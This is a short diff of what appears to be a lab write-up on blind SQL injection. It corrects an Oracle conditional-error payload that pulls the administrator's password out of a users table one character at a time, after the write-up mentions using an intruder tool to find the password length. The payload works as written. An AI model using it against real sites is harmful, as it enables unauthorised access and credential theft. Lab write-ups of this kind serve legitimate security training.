@@ -61,7 +61,7 @@ I fired the intruder to check the length of the password and got 200 ok at the n
 
 
 Enumerate over the password one at a time:
-' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and substring(password, 1, 1) || ' ->
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || '.
 
 
 
